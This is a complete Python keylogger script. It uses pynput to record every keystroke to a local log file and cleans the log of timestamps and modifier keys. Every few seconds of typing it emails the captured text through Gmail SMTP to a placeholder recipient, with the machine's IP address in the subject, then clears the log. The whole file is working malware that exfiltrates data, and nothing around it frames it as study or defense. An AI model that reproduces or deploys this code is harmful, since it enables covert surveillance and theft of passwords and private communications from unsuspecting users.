import logging
import os
from pynput import keyboard
import time
import smtplib
import codecs
import socket

# create log file
PATH = os.getcwd()
# remove file if program has already been executed - file exists
if os.path.exists(PATH + '\\log.txt'):
    os.remove(PATH + '\\log.txt')
log_file = os.path.join(PATH, 'log.txt')
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


# function to handle key press event
def on_press(key):
    global start_time
    try:
        logging.info(key.char)
    except AttributeError:
        logging.info(key)

    elapsed_time = time.time() - start_time
    if elapsed_time > 6:  # seconds of TYPING time, not actual time.
        start_time = time.time()
        reformat_keylogger_file('log.txt')
        try:  # some ascii characters are not accepted.
            send_email('RECEIVANT EMAIL.com')
        except UnicodeEncodeError:
            pass
        # log file cleaning after email being sent
        with open(PATH + '\\log.txt', 'w') as file:
            file.write('')


def reformat_keylogger_file(file):
    # log file saves keys as:
    # 2023-04-19 16:53:05,751: K
    # one by one, so we clean the file

    with open(log_file, "r") as file:
        file_string = file.read()

    # keeping actual keys typed
    lines = file_string.splitlines()
    lines = [x[25:] for x in lines]

    # replace spaces with actual spaces, and dropping shifts, tabs, etc.
    lines = [word.replace("Key.space", " ") if "Key.space" in word else word for word in lines]
    lines = [word for word in lines if not word.startswith("Key.backspace")]
    lines = [word for word in lines if not word.startswith("Key.ctrl_l")]
    lines = [word for word in lines if not word.startswith("Key.shift")]
    lines = [word for word in lines if not word.startswith("Key.alt_l")]
    file_string = ''.join(lines)

    with codecs.open(log_file, "w", encoding="utf-8") as file:
        file.write(file_string)


def send_email(recipient):
    # Set up the connection to the email server
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587
    smtp_username = 'SENDER EMAIL.com'
    smtp_password = 'UR APP PASS'
    ip = socket.gethostbyname(socket.gethostname())

    with open(log_file, "r") as file:
        file_string = file.read()

    with smtplib.SMTP(smtp_server, smtp_port) as smtp:
        smtp.starttls()
        smtp.login(smtp_username, smtp_password)

        # Compose the email message
        subject = f'User at address {ip} has typed:'
        body = file_string
        email_message = f'Subject: {subject}\n\n{body}'

        # Send the email
        smtp.sendmail(smtp_username, recipient, email_message)


start_time = time.time()

# create keyboard listener - main forever loop
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
